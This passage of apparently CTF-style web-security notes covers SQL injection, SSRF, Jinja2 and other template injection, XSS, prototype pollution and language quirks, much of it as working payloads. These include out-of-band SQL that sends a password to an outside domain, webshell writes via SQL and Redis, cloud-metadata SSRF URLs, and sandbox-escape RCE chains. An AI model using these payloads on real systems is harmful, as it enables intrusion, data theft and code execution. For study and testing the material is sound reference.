    - [lodash](https://snyk.io/vuln/SNYK-JS-LODASH-608086) (\_.setWidth, \_.set)
  - Merge / Extend
    - CVE-2019-11358 (jQuery $.extend)
  - Clone
- Prototype Chain
  > When finding a property, JavaScript will go through the Prototype
    Chain until \_\_proto\_\_ is null.

  ```javascript
  > a = []
  > b = []
  > a["__proto__"]["test"] = "testtest" // a["__proto__"] is array
  > b.test
  < "testtest"
  ```
- Case Study
  - [MITRE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution)
  - [HackerOne XSS](https://hackerone.com/reports/986386)
  - [CVE-2019-7609](https://slides.com/securitymb/prototype-pollution-in-kibana)
  - [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
  - [Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)

### SQL Injection
- Type
  > Prevent: Parameterized Query, Prepared Statement

  - Union Based
  - Blind
    - Boolean Based

      ```
      ... id = 1 and length(user()) > 0
      ... id = 1 and length(user()) > 16
      ... id = 1 and ascii(mid(user(),1,1)) > 0
      ... id = 1 and ascii(mid(user(),1,1)) > 80
      ```

    - Time Based
      - sleep

        ```
        ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
        ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
        ```

      - query / large calculation data
      - repeat('A', 10000)
  - Error
    - ExtractValue(xml, xpath)

      ```
      SELECT ExtractValue(1, concat(0x0a,version()));
      -----------------------------------------------
      XPATH syntax error:'
      8.0.20'
      ```

    - UpdateXML(xml, xpath, new\_xml)
    - exp(x)
    - MultiLineString(LineString)
    - MultiPolygon(Polygon)
  - Out-of-Band
    | DB              | Payload                                                                 | Comment   |
    |:----------------|:------------------------------------------------------------------------|:----------|
    | MySQL + Windows | `load_file(concat("\\\\", password, ".splitline.tw"))`                  | DNS Query |
    |                 | SMB + DNS query log ([DNSBin](https://github.com/ettic-team/dnsbin))    |           |
    | Oracle          | `url_http.request('http://splitline.tw/' \|\| (SELECT user FROM dual))` |           |
  - Multi Byte SQL Injection
- Read / Write File
  - `SELECT LOAD_FILE('/etc/passwd')` (MySQL)
  - `SELECT pg_read_file('/etc/passwd', <offset>, <length>)` (PostgresSQL)
  - `SELECT "<?php eval($_GET[x]);?>" INTO OUTFILE "/var/www/html/shell.php"` (MySQL)
- Common Function
  | DB     | Function          |                 |           |            |          |
  |:-------|:------------------|:----------------|:----------|:-----------|:---------|
  | MySQL  | user()            | current\_user() | version() | database() | schema() |
  |        | group\_concat()   |                 |           |            |          |
  | Oracle | url\_http.request |                 |           |            |          |
- Special Table
  | DB           | Payload                                                             | Comment   |
  |:-------------|:--------------------------------------------------------------------|:----------|
  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata;`               | Databases |
  |              | `SELECT table_name FROM information_schema.tables WHERE table_schema = '<database>';`                  | Tables    |
  |              | `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>'`  | Columns   |

### SSRF
> [SSRF bible Cheatsheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)

- Scheme
  > [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)

  - HTTP
    - Docker API  
      `http://IP:2375/images/json`
    - Cloud Metadata (GCP)  
      `http://metadata.google.internal/computeMetadata/v1/...`
    - Cloud Metadata (AWS)  
      `http://169.254.169.254/latest/user-data/...`
  - Gopher
    > Generate arbitrary TCP packet under no interaction.
    >
    > `gopher://<authority>/<padding><tcp payload>`

    - [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)
    - HTTP GET/POST  
      `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A`
    - MySQL (must without password)  
      [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
    - Redis  
      `gopher://127.0.0.1:6379/_SET%20key%20"value"%0D%0A`
    - PHP-FPM
  - Local File
    - `file:///etc/passwd`
    - `file://localhost/etc/passwd`
    - `python` `local_file:///etc/passwd`
    - `java` `file:///var/www/html/`
    - `java` `netdoc:///var/www/html/`
- Authority
  - localhost
    - 127.0.0.1
    - localhost
    - 127.0.1
    - 127.1
    - 0.0.0.0
    - 0
  - IP Address
    - 2130706443 (dec)
    - 0x7f00000001 (hex)
    - 0x7f.0x0.0x0.0x1
    - 0177000000001 (oct)
    - 0177.0.0.01
  - IPv6
    - ::1
    - ::127.0.0.1
    - ::ffff:127.0.0.1
    - ::
    - ip6-localhost
  - IDN Encoding
    - http://www.unicode.org/reports/tr46/  
    - [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/)
    - http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ
  - Domain Name Binding
    - whatever.localtest.me
    - 127.0.0.1.xip.io
  - DNS Rebinding (Round-Robin DNS)
    - foo.bar.10.0.0.1.xip.io
    - A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
    - 36573657.7f000001.rbndr.us
  - 302 Bypass
    > If the environment does not block http redirect, query your own web server which respond
    >
    > ```php
    > <?php
    >   Header("Locathon: gopher://127.0.0.1:9000/_...")
    > ?>
    > ```
  - URL Parser
    - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`
      | 1.1.1.1 | 2.2.2.2  | 3.3.3.3 |
      |:-------:|:--------:|:-------:|
      | urllib2 | requests | urllib  |
      | httplib |          |         |
- Case Study
  - [$1.000 SSRF in Slack](https://elbs.medium.com/1-000-ssrf-in-slack-7737935d3884)
  - [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

### SSTI
- Identify Template Engine
  ![](https://miro.medium.com/max/701/1*3hIShkWH_gjOt1b0LNPURQ.png)
- Jinja2
  > [Flask default template engine (doc)](https://jinja.palletsprojects.com/en/3.1.x/)  
  > [Exploiting Jinja SSTI with limited payload size.](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)  
  > [GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)  
  > [RCE-bypassing-as-much-as-I-possibly-can](https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can)  
  > [On SSTI & bypass of jinja2](https://chowdera.com/2020/12/20201221231521371q.html)  
  > [Builtin Filters](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

  - Get `os`
    - `{{lipsum.__globals__.os}}`
    - `{{cycler.__init__.__globals__.os}}`
  - Load `os`
    - `{{config.from_object('os')}}`
  - `{{ config }}`
    - config.SECRET\_KEY
    - config.from\_pyfile(filename)
  - `{{ request }}`
    - request.args.name
    - request.cookies.name
    - request.headers.name
    - request.values.name
    - request.form.name
  - sandbox bypass

    ```python
    #All the below payloads works under python2
    --------------------------------------------

    #Starting from string or list
    {{ ''.__class__.__base__ }}

    #File operation
    {{ ''.__class__.__mro__[2].__subclasses__() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
    
    #RCE
    {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
    > uid=1000(ubuntu)gid=1000(ubuntu)...

    #All the below payloads works under python3
    --------------------------------------------
    {{ ().__class__.__base__.__subclasses__() }}
    {{ ().__class__.__base__.__subclasses__()[132] }} #<class 'os._wrap_close'>
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__ }}
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}

    #Find eval
    {% for c in [].__class__.__base__.__subclasses__(): %}
      {% if c.__name__ == 'catch_warnings': %}
        {% for b in c.__init__.__globals__.values(): %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys(): %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
        {% endif %}
      {% endif %}
    {% endfor %}

    #Import
    {% for x in ().__class__.__base__.__subclasses__() %}
      {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__["__import__"]("os").popen(request.args.payload).read()}}
      {% endif %}
    {% endfor %}
    ```

  - Bypass
    - `.`

      ```txt
      /?ssti={{libsum['__globals__']['os']}}
      ```

    - `.` `_`

      ```txt
      /?ssti={{lipsum['\x5f\x5fglobals\x5f\x5f']['os']}}
      ```

    - `.` `_` `[` `]`

      ```txt
      /?ssti={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os')}}
      ```

    - `.` `_` `[` `]` `|`

      ```txt
      /?ssti={{getattr(getattr(lipsum,'\x5f\x5fglobals\x5f\x5f'), 'os')}}
      ```

    - `.` `_` `[` `]` `{{` `}}`

      ```txt
      /?ssti={%if lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os') %}{%endif%}
      ```

    - length or other special characters (`'` `"`)

      ```txt
      /?ssti={{lipsum[request.args.param1][request.args.param2]}}&param1=__globals__&param2=os

      /?ssti={{config.update(payload=request.args.param1)}}&param1=ls
      /?ssti={{lipsum.__globals__.os.popen(config.payload)}}
      ```
- Ruby erb
  - `<%= system('id') %>`
- PHP Smarty
  - `{ system('id') }`
- PHP Twig
  - `{{ ['id'] | filter('system') }}`
- Node.js ejs
  - `<%= global.process.mainModule.require("child_process").execSync("id").toString() %>`
- Format String Attack

### XS-Leaks
> [xsleaks.dev](https://xsleaks.dev/)
> [xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)  

- Browser-based side channel attack  

### XSS
> [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

- Type
  - Self-XSS
  - Reflected XSS
  - Stored XSS
- Mitigation
  - Filter
    | Pattern       | Bypass                                     |
    |:--------------|:-------------------------------------------|
    | [SPACE]on...= | <svg`<TAB>`onload=alert(1)>                |
    | [SPACE]on...= | <svg`\n`onload=alert(1)>                   |
    | [SPACE]on...= | <svg/ onload=alert(1)>                     |
    | javascript:   | `<a href="\x01javascript:alert(1)">X</a>`  |
    | javascript:   | `<a href="java\tscript:alert(1)">X</a>`    |
    | javascript:   | `<a href="java&Tab;script:alert(1)">X</a>` |
    | <script       | JSFuck                                     |
  - Escape (HTML Entity)
    | Symbol | Alternative |
    |:-------|:------------|
    | `<`    | `&lt;`      |
    | `>`    | `&gt;`      |
    | `"`    | `&quot;`    |
  - Content Security Policy (CSP)
    > [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
    - script-src
    - Nonce
  - trusted-types (Chrome)
  - HTTP response header
  - Define trusted resources
  - HttpOnly
- Bypass
  - `<base>`
    - Change base URL of all relative URL
  - Relative Path Overwrite (RPO)
- Case Study
  - [XS-Search abusing the Chrome XSS Auditor](https://www.youtube.com/watch?v=HcrQy0C-hEA)
  - [Mutation XSS in Google Search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
  - [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

### XXE (XML External Entity Injection)


## Programming & Framework

### C
- .init / .fini

  ```C
  #include <stdio.h>
  __attribute__((constructor(101))) void func1() {
  }

  __attribute__((constructor(102))) void func2() {
  }

  __attribute__((constructor)) void func3() {
  }

  __attribute__((destructor)) void func4() { // Run after main function.
  }

  int main() {
    return 0;
  }
  ```

### Shell
- [Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)
  | Parameter Expansion   | x="a1 b1 c2 d2" |
  |:----------------------|:----------------|
  | `${x#*1}`             | &nbsp; b1 c2 d2 |
  | `${x##*1}`            | &nbsp; c2 d2    |
  | `${x%1*}`             | a1 b            |
  | `${x%%1*}`            | a               |
  | `${x/1/3}`            | a3 b1 c2 d2     |
  | `${x//1/3}`           | a3 b3 c2 d2     |
  | `${x//?1/z3}`         | z3 z3 c2 d2     |
  | `${x:0:2}`            | a1              |
- Command
  - printf

    ```bash
    printf '%s.' a b c
    ------------------
    a.b.c.
    ```

### Redis
- Write file

  ```
  FLUSHALL
  SET payload "<?php phpinfo() ?>"
  CONFIG SET DIR /var/www/html/
  CONFIG SET DBFILENAME shell.php
  SAVE
  ```

- [RCE](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

### JavaScript
- Reference
  - [wtfjs](https://github.com/denysdovhan/wtfjs)
  - [JavaScript Truth Table](https://thomas-yang.me/projects/oh-my-dear-js/)
  - [你懂 JavaScript 嗎？#8 強制轉型（Coercion）](https://ithelp.ithome.com.tw/articles/10201512)
- Weak Type (comparison `==`)
  - [] == 0
  - [] == "0"
  - ['a', ['b', 'c']] == "a,b,c"
  - "b" + "a" + + "a" + "a" == baNaNa
- Prototype Chain
  ```
  __proto__ 
  ─────────>
                                      
         ┌─────────────────────────────┐ ┌───────────────────────────────────────────────────┐
         │                             │ │                                                   │
         │                             │ │                                                   │
         │                             │ │                   ┌──────┐                        │
         │                             │ │                   │ null │                        │
         │                             │ │                   └──────┘                        │
         │                             │ │                      ↑                            │
         │                             ↓ ↓                      │                            │
  ┌────────────┐    prototype┌────────────────────┐    ┌──────────────────┐  constructor┌──────────┐
  │ Function() │─────────────│ Function.prototype │───>│ Object.prototype │─────────────│ Object() │
  └────────────┘constructor  └────────────────────┘    └──────────────────┘prototype    └──────────┘
                                        ↑                       ↑          
                                        │                       │
                                     ┌─────┐    prototype┌─────────────┐
                                     │ A() │─────────────│ A.prototype │
                                     └─────┘constructor  └─────────────┘
                                                                ↑          
                                                                │
                                                           ┌─────────┐
                                                           │ new A() │
                                                           └─────────┘
  ```

### PHP
- Reference
  - [php.net](https://www.php.net/)
- Weak Type (comparison `==`)
  - [PHP Truth Table](https://www.php.net/manual/en/types.comparisons.php)
  - `0eXXXX == 0eYYYY`
  - PHP Array
    - $arr[idx] <-> $arr{idx}
    - strcmp([], []) -> NULL
    - md5([]) -> NULL
    - sha1([ ]) -> NULL
    - strlen([ ]) -> NULL
    - file\_put\_contents("info.php", ["<?php ", "phpinfo();"]);
- Keyword Bypass
  - Case Insensitive
    - `<?php SySTeM("ls -al"); ?>`
  - Variable Function
    - `$func="system"; $func("ls -al");`
  - system(id) -> system("id")
  - echo \`id\` -> system("id")
- [Tags](https://www.php.net/manual/en/language.basic-syntax.phptags.php)
  - normal tag

    ```
    <?php echo 'test' ?>
    ```

  - short tag
    > can be disabled via the `short_open_tag` in `php.ini`, or are disabled
    > by default if PHP is built with the `--disable-short-tags` configuration

    ```php
    <? echo 'test' ?>
    ```

  - short echo tag

    ```php
    <?= 'test' ?>
    ```

### Python
- Reference
  - [wtfpython](https://github.com/satwikkansal/wtfpython) 

### Ruby
- Object Model
  ```
  superclass
  ──────────>

      ┌──────────────────────────────────────────────────────────┐
      │                                                          │
      │                       ┌─────┐                            │
      │                       │ nil │                            │
      │                       └─────┘                            │
      │                          ↑                               │
      │                          │                               │
      │                   ┌─────────────┐  singleton_class┌──────────────┐ 
      │                   │ BasicObject │─────────────────│ #BasicObject │
      │                   └─────────────┘                 └──────────────┘
      │                          ↑                               ↑
      ↓                          │                               │
  ┌───────┐    ┌────────┐    ┌────────┐      singleton_class┌─────────┐
  │ Class │───>│ Module │───>│ Object │─────────────────────│ #Object │
  └───────┘    └────────┘    └────────┘                     └─────────┘
                                 ↑                               ↑ 
                                 │                               │
                          class┌───┐            singleton_class┌────┐
          ┌────────────────────│ A │───────────────────────────│ #A │
          │                    └───┘                           └────┘
          │                      ↑  
          │                      │  
        ┌───┐   singleton_class┌────┐
        │ a │──────────────────│ #a │
        └───┘                  └────┘

  ```
